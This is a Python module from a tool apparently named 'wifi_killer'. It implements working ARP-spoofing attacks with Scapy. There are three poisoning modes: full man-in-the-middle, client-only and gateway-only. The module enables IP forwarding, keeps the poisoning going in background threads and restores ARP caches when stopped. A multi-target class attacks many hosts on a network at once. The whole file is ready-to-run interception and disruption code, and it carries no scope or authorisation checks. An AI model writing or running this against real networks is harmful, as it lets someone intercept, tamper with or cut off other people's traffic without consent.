"""
modules/attacker.py – Module 3: ARP-based Attack / Control.

Methods:
  A – Full MITM         : poison both client ↔ gateway (bi-directional)
  B – Client-only       : tell client the gateway is the attacker
  C – Gateway-only      : tell gateway the client is the attacker

Each method runs in a background thread.
Use ArpAttack.start() / stop() to control it.
ARP restoration is automatic on stop().
"""

from __future__ import annotations

import threading
import time
from typing import Optional

try:
    from scapy.all import ARP, send, conf  # type: ignore

    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

from wifi_killer.modules.config import attack_config


# ------------------------------------------------------------------ #
# ARP helpers                                                         #
# ------------------------------------------------------------------ #

def _get_mac(ip: str, iface: Optional[str] = None, timeout: float = 3.0) -> Optional[str]:
    """Resolve IP → MAC via ARP request."""
    if not SCAPY_AVAILABLE:
        raise RuntimeError("Scapy is required.")
    from scapy.all import srp, ARP, Ether

    kwargs: dict = {"timeout": timeout, "verbose": 0}
    if iface:
        kwargs["iface"] = iface
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    ans, _ = srp(pkt, **kwargs)
    if ans:
        return ans[0][1].hwsrc.upper()
    return None


def _spoof(
    target_ip: str,
    spoof_ip: str,
    src_mac: Optional[str] = None,
    iface: Optional[str] = None,
    burst: int = 1,
    inter_delay: float = 0.05,
) -> None:
    """Send *burst* gratuitous/unsolicited ARP reply packets.

    Tells *target_ip*: "The MAC address of *spoof_ip* is *src_mac*."
    src_mac defaults to the attacker's interface MAC (Scapy fills it).
    """
    if not SCAPY_AVAILABLE:
        return
    pkt = ARP(
        op=2,           # is-at (reply)
        pdst=target_ip,
        psrc=spoof_ip,
        hwdst="ff:ff:ff:ff:ff:ff",
    )
    if src_mac:
        pkt.hwsrc = src_mac
    for _ in range(burst):
        send(pkt, verbose=0, iface=iface or conf.iface)
        if burst > 1:
            time.sleep(inter_delay)


def _restore(
    target_ip: str,
    target_mac: str,
    real_src_ip: str,
    real_src_mac: str,
    iface: Optional[str] = None,
    count: int = 5,
) -> None:
    """Send correct ARP replies to restore *target_ip*'s ARP cache."""
    if not SCAPY_AVAILABLE:
        return
    pkt = ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=real_src_ip,
        hwsrc=real_src_mac,
    )
    for _ in range(count):
        send(pkt, verbose=0, iface=iface or conf.iface)
        time.sleep(0.1)


# ------------------------------------------------------------------ #
# Main attack class                                                    #
# ------------------------------------------------------------------ #

class ArpAttack:
    """Manages a single ARP-spoofing attack session.

    Parameters
    ----------
    method : str
        'A' – full MITM (bi-directional)
        'B' – client-only poison
        'C' – gateway-only poison
    target_ip : str
        IP of the victim client.
    gateway_ip : str
        IP of the default gateway.
    iface : str, optional
        Network interface to use.
    """

    METHODS = ("A", "B", "C")

    def __init__(
        self,
        method: str,
        target_ip: str,
        gateway_ip: str,
        iface: Optional[str] = None,
    ) -> None:
        method = method.upper()
        if method not in self.METHODS:
            raise ValueError(f"method must be one of {self.METHODS}")
        self.method = method
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.iface = iface

        # Resolved MACs (filled on start)
        self.target_mac: Optional[str] = None
        self.gateway_mac: Optional[str] = None
        self.attacker_mac: Optional[str] = None

        self._stop_event = threading.Event()
        self._thread: Optional[threading.Thread] = None

    # ---------------------------------------------------------------- #

    def start(self) -> None:
        """Resolve MACs then launch the background spoofing thread."""
        if not SCAPY_AVAILABLE:
            raise RuntimeError("Scapy is required for ARP attacks.")

        print(f"[*] Resolving MACs for target {self.target_ip} and gateway {self.gateway_ip} …")
        self.target_mac = _get_mac(self.target_ip, self.iface)
        self.gateway_mac = _get_mac(self.gateway_ip, self.iface)

        if not self.target_mac:
            raise RuntimeError(f"Could not resolve MAC for target {self.target_ip}")
        if not self.gateway_mac:
            raise RuntimeError(f"Could not resolve MAC for gateway {self.gateway_ip}")

        # Get our own MAC
        from wifi_killer.utils.network import get_interface_mac, _default_iface

        iface = self.iface or _default_iface()
        attacker_mac = get_interface_mac(iface)
        if not attacker_mac:
            # Last-resort: try to get the MAC of Scapy's chosen interface
            attacker_mac = get_interface_mac(conf.iface)
        if not attacker_mac:
            raise RuntimeError(
                f"Could not determine attacker MAC address for interface '{iface}'."
            )
        self.attacker_mac = attacker_mac

        # Enable IP forwarding so the victim still has connectivity during MITM
        from wifi_killer.modules.throttler import enable_ip_forward
        enable_ip_forward()

        print(f"[+] Target  : {self.target_ip} ({self.target_mac})")
        print(f"[+] Gateway : {self.gateway_ip} ({self.gateway_mac})")
        print(f"[+] Attacker: {self.attacker_mac} (iface={iface})")
        print(f"[*] Starting ARP-spoof method {self.method} …")

        self._stop_event.clear()
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        """Stop the attack and restore correct ARP entries."""
        if self._thread is None:
            return
        print("\n[*] Stopping ARP spoof and restoring ARP caches …")
        self._stop_event.set()
        self._thread.join(timeout=attack_config.interval * 3)
        self._restore_arp()
        print("[+] ARP caches restored.")

    @property
    def is_running(self) -> bool:
        return self._thread is not None and self._thread.is_alive()

    # ---------------------------------------------------------------- #

    def _run(self) -> None:
        cfg = attack_config
        while not self._stop_event.is_set():
            try:
                self._send_spoof()
            except Exception as exc:
                print(f"[WARN] Spoof error: {exc}")
            self._stop_event.wait(cfg.interval)

    def _send_spoof(self) -> None:
        cfg = attack_config
        if self.method == "A":
            # Tell client: gateway's MAC is mine
            _spoof(
                self.target_ip, self.gateway_ip,
                iface=self.iface, burst=cfg.burst, inter_delay=cfg.inter_burst_delay,
            )
            # Tell gateway: client's MAC is mine
            _spoof(
                self.gateway_ip, self.target_ip,
                iface=self.iface, burst=cfg.burst, inter_delay=cfg.inter_burst_delay,
            )
        elif self.method == "B":
            # Tell client: gateway's MAC is mine
            _spoof(
                self.target_ip, self.gateway_ip,
                iface=self.iface, burst=cfg.burst, inter_delay=cfg.inter_burst_delay,
            )
        elif self.method == "C":
            # Tell gateway: client's MAC is mine
            _spoof(
                self.gateway_ip, self.target_ip,
                iface=self.iface, burst=cfg.burst, inter_delay=cfg.inter_burst_delay,
            )

    def _restore_arp(self) -> None:
        if not (self.target_mac and self.gateway_mac):
            return
        if self.method in ("A", "B"):
            # Fix client's cache: tell it real gateway MAC
            _restore(
                self.target_ip, self.target_mac,
                self.gateway_ip, self.gateway_mac,
                iface=self.iface,
            )
        if self.method in ("A", "C"):
            # Fix gateway's cache: tell it real client MAC
            _restore(
                self.gateway_ip, self.gateway_mac,
                self.target_ip, self.target_mac,
                iface=self.iface,
            )


# ------------------------------------------------------------------ #
# Convenience: attack all hosts                                       #
# ------------------------------------------------------------------ #

class MultiTargetAttack:
    """Launch ArpAttack instances against multiple targets simultaneously."""

    def __init__(
        self,
        method: str,
        targets: list[dict],
        gateway_ip: str,
        iface: Optional[str] = None,
    ) -> None:
        self.attacks: list[ArpAttack] = [
            ArpAttack(method, t["ip"], gateway_ip, iface)
            for t in targets
        ]

    def start(self) -> None:
        for atk in self.attacks:
            atk.start()

    def stop(self) -> None:
        for atk in self.attacks:
            atk.stop()
